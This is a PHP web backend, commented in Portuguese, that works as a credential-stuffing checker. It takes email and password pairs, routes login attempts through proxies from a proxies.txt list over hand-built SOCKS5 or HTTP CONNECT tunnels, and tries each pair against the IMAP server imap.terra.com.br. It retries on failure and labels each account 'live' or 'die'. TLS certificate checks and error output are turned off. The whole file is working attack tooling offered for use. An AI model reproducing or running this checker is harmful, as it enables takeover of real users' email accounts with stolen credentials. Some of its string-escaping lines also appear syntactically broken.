<?php
// ═══════════════════════════════════════
//  LIMPEZA TOTAL DE OUTPUT — destrói
//  TODOS os buffers existentes antes de
//  qualquer coisa, garantindo JSON puro
// ═══════════════════════════════════════
while (ob_get_level() > 0) { ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '120');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? '';

// =========================================
//  INIT
// =========================================
if ($action === 'init') {
    $proxies = [];
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode("\n", $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(['status' => 'ok', 'proxies' => array_values(array_unique($proxies))]);
    exit;
}

// =========================================
//  TEST_PROXY
// =========================================
if ($action === 'test_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(['status' => 'fail']);
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(['status' => $ok ? 'ok' : 'fail']);
    exit;
}

// =========================================
//  DIAG_PROXY
// =========================================
if ($action === 'diag_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(['status' => 'fail', 'msg' => 'Proxy vazio']);
        exit;
    }
    $p = parseProxy($proxy);
    $diag = ['proxy' => $proxy, 'parsed' => $p, 'steps' => []];

    // Test 1: TCP connect ao proxy
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, 10);
    $diag['steps']['tcp'] = [
        'ok' => $socket !== false,
        'err' => $socket === false ? "$errstr ($errno)" : null,
    ];
    if ($socket !== false) fclose($socket);

    // Test 2: HTTP CONNECT manual
    $manual = testManualConnect($proxy, 10);
    $diag['steps']['http_connect'] = $manual;

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

// =========================================
//  CHECK
// =========================================
if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $proxy = $_POST['proxy'] ?? '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = ['status' => 'die', 'email' => $email, 'reason' => 'Erro'];
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(['status' => 'ok']);
exit;

// =========================================
//  PARSE PROXY
// =========================================
function parseProxy($proxy) {
    $host = '';
    $port = 0;
    $user = '';
    $pass = '';
    $type = 'http';

    $lower = strtolower($proxy);

    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';

    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }

    return ['host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type];
}

// =========================================
//  TEST PROXY (HTTPS via cURL)
// =========================================
function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    @curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    @curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    @curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);

    if ($p['type'] === 'socks5') {
        @curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        @curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        @curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }

    if (!empty($p['user'])) {
        @curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }

    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

// =========================================
//  DO VALIDATE
// =========================================
function doValidate($email, $password, $proxy = '') {
    $timeout = 20;
    $delays = [0, 3000000, 6000000, 10000000, 15000000];

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        if (!empty($proxy)) {
            $r = tryProxyImap($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        } else {
            if (extension_loaded('curl')) {
                $r = tryCurlDirect($email, $password, $timeout);
                if ($r !== null) return $r;
            }
            $r = trySocketDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
}

// =========================================
//  PROXY IMAP — detecta SOCKS5 vs HTTP
//  e usa a implementação manual correta
// =========================================
function tryProxyImap($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return null;

    if ($p['type'] === 'socks5') {
        return trySocks5Imap($email, $password, $timeout, $p);
    } else {
        return tryHttpConnectImap($email, $password, $timeout, $p);
    }
}

// =========================================
//  SOCKS5 + TLS + IMAP (manual)
// =========================================
function trySocks5Imap($email, $password, $timeout, $p) {
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // SOCKS5 greeting
    $methods = "\x05\x02\x00\x02";
    fwrite($socket, $methods);
    $greeting = @fread($socket, 2);
    if (strlen($greeting) < 2) { fclose($socket); return null; }
    $method = ord($greeting[1]);

    if ($method === 0x02) {
        $user = $p['user'];
        $pass = $p['pass'];
        $authPacket = chr(0x01) . chr(strlen($user)) . $user . chr(strlen($pass)) . $pass;
        fwrite($socket, $authPacket);
        $authResp = @fread($socket, 2);
        if (strlen($authResp) < 2 || ord($authResp[1]) !== 0x00) { fclose($socket); return null; }
    } elseif ($method !== 0x00) {
        fclose($socket); return null;
    }

    // CONNECT imap.terra.com.br:993
    $target = 'imap.terra.com.br';
    $connectReq = "\x05\x01\x00\x03" . chr(strlen($target)) . $target . pack('n', 993);
    fwrite($socket, $connectReq);

    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (strlen($resp) < 10 && !feof($socket) && microtime(true) < $deadline) {
        $chunk = @fread($socket, 10 - strlen($resp));
        if ($chunk === false || $chunk === '') {
            usleep(100000);
            continue;
        }
        $resp .= $chunk;
    }
    if (strlen($resp) < 10 || ord($resp[1]) !== 0x00) { fclose($socket); return null; }

    // TLS
    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }

    // IMAP
    return doImapLogin($socket, $email, $password, $timeout);
}

// =========================================
//  HTTP CONNECT + TLS + IMAP (manual)
// =========================================
function tryHttpConnectImap($email, $password, $timeout, $p) {
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // HTTP CONNECT
    $target = 'imap.terra.com.br';
    $connectReq = "CONNECT {$target}:993 HTTP/1.1\r\n";
    $connectReq .= "Host: {$target}:993\r\n";
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $connectReq .= "Proxy-Authorization: Basic {$auth}\r\n";
    }
    $connectReq .= "Proxy-Connection: Keep-Alive\r\n\r\n";

    fwrite($socket, $connectReq);

    // Ler resposta HTTP
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) {
            usleep(100000);
            continue;
        }
        $response .= $line;
        if ($line === "\r\n" || $line === "\n") break;
    }

    if (stripos($response, '200') === false) { fclose($socket); return null; }

    // TLS
    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }

    // IMAP
    return doImapLogin($socket, $email, $password, $timeout);
}

// =========================================
//  TLS handshake com retry
// =========================================
function enableTLS($socket, $timeout) {
    $deadline = microtime(true) + $timeout;
    while (microtime(true) < $deadline) {
        $result = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($result === true) return true;
        if ($result === false) return false;
        // 0 = needs more data, wait and retry
        usleep(100000);
    }
    return false;
}

// =========================================
//  IMAP LOGIN (comum para ambos os métodos)
// =========================================
function doImapLogin($socket, $email, $password, $timeout) {
    // Ler greeting
    $greeting = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(100000); continue; }
        $greeting .= $line;
        if (strpos($line, "\n") !== false) break;
    }
    if (stripos($greeting, 'OK') === false) { fclose($socket); return null; }

    // LOGIN
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");

    // Ler resposta
    $response = '';
    $deadline2 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(100000); continue; }
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline2) break;
    }

    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);

    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}

// =========================================
//  Teste manual para diag_proxy
// =========================================
function testManualConnect($proxy, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) {
        return ['ok' => false, 'err' => 'Parse failed'];
    }

    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) {
        return ['ok' => false, 'err' => "fsockopen: $errstr ($errno)"];
    }
    stream_set_timeout($socket, $timeout);

    if ($p['type'] === 'socks5') {
        // SOCKS5 greeting
        fwrite($socket, "\x05\x02\x00\x02");
        $g = @fread($socket, 2);
        if (strlen($g) < 2) { fclose($socket); return ['ok' => false, 'err' => 'SOCKS5 greeting failed']; }
        $method = ord($g[1]);
        if ($method === 0x02) {
            $auth = chr(0x01) . chr(strlen($p['user'])) . $p['user'] . chr(strlen($p['pass'])) . $p['pass'];
            fwrite($socket, $auth);
            $ar = @fread($socket, 2);
            if (strlen($ar) < 2 || ord($ar[1]) !== 0) { fclose($socket); return ['ok' => false, 'err' => 'SOCKS5 auth failed']; }
        }
        $target = 'imap.terra.com.br';
        fwrite($socket, "\x05\x01\x00\x03" . chr(strlen($target)) . $target . pack('n', 993));
        $resp = '';
        $dl = microtime(true) + $timeout;
        while (strlen($resp) < 10 && microtime(true) < $dl) {
            $c = @fread($socket, 10);
            if ($c === false || $c === '') { usleep(50000); continue; }
            $resp .= $c;
        }
        if (strlen($resp) < 10 || ord($resp[1]) !== 0) { fclose($socket); return ['ok' => false, 'err' => 'SOCKS5 connect failed: ' . bin2hex($resp)]; }
    } else {
        // HTTP CONNECT
        $target = 'imap.terra.com.br';
        $req = "CONNECT {$target}:993 HTTP/1.1\r\nHost: {$target}:993\r\n";
        if (!empty($p['user'])) {
            $auth = base64_encode($p['user'] . ':' . $p['pass']);
            $req .= "Proxy-Authorization: Basic {$auth}\r\n";
        }
        $req .= "\r\n";
        fwrite($socket, $req);
        $resp = '';
        $dl = microtime(true) + $timeout;
        while (!feof($socket) && microtime(true) < $dl) {
            $line = @fgets($socket, 8192);
            if ($line === false) { usleep(50000); continue; }
            $resp .= $line;
            if ($line === "\r\n" || $line === "\n") break;
        }
        if (stripos($resp, '200') === false) { fclose($socket); return ['ok' => false, 'err' => 'CONNECT failed', 'response' => substr($resp, 0, 300)]; }
    }

    // TLS
    $tls = enableTLS($socket, $timeout);
    if ($tls !== true) { fclose($socket); return ['ok' => false, 'err' => 'TLS failed']; }

    // IMAP greeting
    $greeting = '';
    $dl = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $dl) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, "\n") !== false) break;
    }
    fclose($socket);

    if (stripos($greeting, 'OK') === false) {
        return ['ok' => false, 'err' => 'No IMAP greeting', 'greeting' => substr($greeting, 0, 200)];
    }
    return ['ok' => true, 'greeting' => substr($greeting, 0, 200)];
}

// =========================================
//  CURL DIRETO (sem proxy)
// =========================================
function tryCurlDirect($email, $password, $timeout) {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    @curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    @curl_setopt($ch, CURLOPT_USERNAME, $email);
    @curl_setopt($ch, CURLOPT_PASSWORD, $password);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    @curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

// =========================================
//  SOCKET DIRETO (sem proxy)
// =========================================
function trySocketDirect($email, $password, $timeout) {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}
